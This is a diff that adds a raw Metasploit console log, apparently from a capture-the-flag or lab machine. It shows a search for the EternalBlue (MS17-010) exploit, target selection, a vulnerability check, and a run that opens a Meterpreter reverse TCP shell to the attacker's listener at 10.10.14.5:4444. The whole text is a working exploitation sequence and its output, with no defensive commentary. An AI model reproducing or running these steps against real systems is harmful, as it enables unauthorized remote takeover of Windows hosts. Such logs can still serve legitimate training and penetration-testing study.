@@ -1,0 +1,26 @@
+msf6 > search eternalblue
+
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank     Check  Description
+   -  ----                                            ----------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue         2017-03-14        average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  auxiliary/admin/smb/ms17_010_command             2017-03-14        normal   No     MS17-010 EternalBlue SMB Remote Windows Command Execution
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.42.10
+RHOSTS => 10.129.42.10
+msf6 exploit(windows/smb/ms17_010_eternalblue) > check
+
+[*] 10.129.42.10:445 - Scanning for vulnerable SMB service.
+[+] 10.129.42.10:445 - The target is vulnerable.
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.10.14.5:4444
+[+] 10.129.42.10:445 - Connection established for exploitation.
+[*] Sending stage (200262 bytes) to 10.129.42.10
+[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.129.42.10:49158) at 2026-07-29 10:15:00 +0000
+[+] Deleted C:\Windows\Temp\x.exe
+meterpreter >
